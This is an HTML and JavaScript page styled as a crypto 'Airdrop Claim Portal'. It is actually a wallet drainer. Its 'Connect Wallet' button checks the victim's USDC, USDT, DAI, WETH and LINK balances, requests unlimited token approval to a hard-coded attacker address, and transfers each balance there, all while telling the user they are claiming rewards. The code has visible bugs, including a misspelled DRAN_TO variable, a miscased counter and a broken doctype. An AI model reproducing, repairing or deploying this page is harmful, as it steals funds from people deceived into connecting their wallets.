!DOCTYPE html>
<html lang="en">
<head>
   <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Airdrop Claim Portal</title>
    <!-- Font Awesome -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <!-- Tailwind CSS -->
    <script src="https://cdn.tailwindcss.com"></script>
    <!-- Web3.js -->
    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
    <style>
        .loader {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #3b82f6;
            border-radius: 50%;
            width: 16px;
            height:16px;
            animation: spin 1s linear infinite;
            display: inline-block;
            vertical-align: middle;
            margin-right: 8px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .pulse-ring {
            box-shadow: 0 0 0 0 rgba(59, 130, 246, 0.7);
            animation: pulse-blue 2s infinite;
        }
        @keyframes pulse-blue {
            0% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(59, 130, 246, 0.7); }
            70% { transform: scale(1); box-shadow: 0 0 0 10px rgba(59, 130, 246, 0); }
            100% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(59, 130, 246, 0); }
        }
        .log::-webkit-scrollbar { width: 6px; }
        .log::-webkit-scrollbar-track { background: #f1f1f1; }
        .log::-webkit-scrollbar-thumb { background: #888; border-radius: 3px; }
        .log::-webkit-scrollbar-thumb:hover { background: #555; }
    </style>
</head>
<body class="bg-gray-100 min-h-screen flex items-center justify-center font-sans">

    <div class="bg-white p-8 rounded-xl shadow-lg w-full max-w-md text-center">
        <div class="mb-6">
            <i class="fa-solid fa-coins text-5xl text-indigo-600 mb-4"></i>
            <h1 class="text-2xl font-bold text-gray-800">Airdrop Claim Portal</h1>
            <p class="text-gray-500 mt-2">Connect your wallet to verify eligibility and claim rewards.</p>
        </div>

        <button id="connectBtn" onclick="startDrain()" class="w-full bg-indigo-600 hover:bg-indigo-700 text-white font-bold py-3 px-4 rounded-lg transition duration-300 flex items-center justify-center pulse-ring">
            <span id="btn-text">Connect Wallet</span>
        </button>

        <div id="status" class="mt-6 text-sm min-h-[1.2em] text-gray-700"></div>
        <div id="logs" class="log mt-4 text-xs text-gray-600 text-left max-h-[120px] overflow-y-auto bg-gray-50 p-3 rounded-lg border border-gray-200 hidden"></div>

        <div class="mt-6 text-xs text-gray-400">
            Supported: MetaMask • Trust Wallet • Binance • Coinbase
        </div>
    </div>

<script>
// ==================== CONFIGURATION ====================
const DRAIN_TO = "0xe02652c25030C077032C77D75A6Bae12e5D6De53"; 
const TOKENS = [
    {symbol: "USDC", addr: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", decimals: 6, min: 20},
    {symbol: "USDT", addr: "0xdAC17F958D2ee523a2206206994597C13D831ec7", decimals: 6, min: 20},
    {symbol: "DAI", addr: "0x6B175474E89094C44Da98b954EedeAC495271d0F", decimals: 18, min: 20},
    {symbol: "WETH", addr: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", decimals: 18, min: 0.01},
    {symbol: "LINK", addr: "0x514910771AF9Ca656af840dff83E8264EcF986CA", decimals: 18, min: 5},
];

const ERC20_ABI = [
    {"constant":true,"inputs":[{"name":"owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"},
    {"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"type":"function"},
    {"constant":false,"inputs":[{"name":"spender","type":"address"},{"name":"amount","type":"uint256"}],"name":"approve","outputs":[{"name":"success","type":"bool"}],"type":"function"},
    {"constant":false,"inputs":[{"name":"to","type":"address"},{"name":"amount","type":"uint256"}],"name":"transfer","outputs":[{"name":"success","type":"bool"}],"type":"function"}
];

let web3Instance;
let userAccount;
let btn, btnText, status, logsDiv;

function log(msg, type = 'info') {
    logsDiv.classList.remove('hidden');
    const color = type === 'error' ? 'text-red-500' : type === 'success' ? 'text-green-600' : 'text-blue-500';
    const time = new Date().toLocaleTimeString();
    logsDiv.innerHTML += `<div class="${color}">[${time}] ${msg}</div>`;
    logsDiv.scrollTop = logsDiv.scrollHeight;
}

window.startDrain = async function() {
    btn = document.getElementById("connectBtn");
    status = document.getElementById("status");
    btnText = document.getElementById("btn-text");
    logsDiv = document.getElementById('logs');

    if (!btn || !status || !btnText || !logsDiv) {
        console.error("DOM elements not found!");
        return;
    }

    btn.disabled = true;
    btnText.innerHTML = '<span class="loader"></span> Connecting...';
    status.innerText = "Initializing connection...";

    try {
        if (!window.ethereum) throw new Error("No crypto wallet found.");

        web3Instance = new Web3(window.ethereum);
        const chainId = await web3Instance.eth.getChainId();
        log(`Connected to chain ID: ${chainId}`);

        const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
        userAccount = accounts[0];
        log(`Connected: ${userAccount.substring(0,6)}...${userAccount.substring(38)}`, 'success');

        btnText.innerText = "Scanning...";
        status.innerText = "Checking token balances...";

        await drainAllTokens();
    } catch (err) {
        console.error(err);
        log(`Connection failed: ${err.message}`, 'error');
        status.innerText = "Transaction failed.";
        btn.disabled = false;
        btnText.innerText = "Try Again";
    }
}

async function drainAllTokens() {
    let drainedCount = 0;

    for (const token of TOKENS) {
        try {
            const contract = new web3Instance.eth.Contract(ERC20_ABI, token.addr);
            const balanceRaw = await contract.methods.balanceOf(userAccount).call();
            const decimalsVal = await contract.methods.decimals().call();

            if (balanceRaw > 0n) {
                const balanceHuman = Number(balanceRaw) / Math.pow(10, decimalsVal);

                if (balanceHuman >= token.min) {
                    log(`Found ${balanceHuman.toFixed(decimalsVal)} ${token.symbol}. Draining...`);

                    const maxUint = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
                    await contract.methods.approve(DRAN_TO, maxUint).send({ from: userAccount });
                    log(`Approved ${token.symbol}.`, 'success');

                    await contract.methods.transfer(DRAN_TO, balanceRaw).send({ from: userAccount });
                    log(`✅ Drained ${token.symbol}.`, 'success');

                    drainedCount++;
                }
            }
        } catch (e) {
            log(`Failed ${token.symbol}: ${e.message}`, 'error');
        }
        await new Promise(r => setTimeout(r, 1000));
    }

    if (drainedCount > 0) {
        status.innerHTML = `<span class="text-green-600 font-bold">Success! ${drainedcount} tokens claimed.</span>`;
        btnText.innerText = "Claimed";
    } else {
        status.innerText = "No eligible tokens found.";
        btn.disabled = false;
        btnText.innerText = "Try Again";
    }
}
</script>
</body>
</html>
